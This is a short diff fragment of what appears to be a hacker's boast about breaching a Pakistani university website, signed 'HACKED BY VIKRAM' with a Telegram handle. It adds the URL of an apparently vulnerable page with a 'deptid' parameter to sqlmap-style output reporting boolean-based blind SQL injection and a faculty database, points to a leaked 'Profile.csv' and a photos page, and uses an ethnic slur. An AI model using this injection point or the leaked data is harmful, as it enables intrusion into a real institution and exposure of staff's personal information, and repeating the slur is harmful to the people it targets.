@@ -10,6 +10,8 @@ Designation: Computer Systems Engineering, Assistant Professor
 
 P4YL04D
 
+https://www.quest.edu.pk/departments/administration.php?deptid=32
+
 Parameter: deptid (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
@@ -43,6 +45,10 @@ available databases [4]:
 [*] questedu_fac_profiled
 
 =====================================
+
+Check this URL for the photos of some porkis https://quest.edu.pk/departments/photos/
+
+Check Profile.csv
 
 HACKED BY VIKRAM @VIKRAM0X00 TG
 
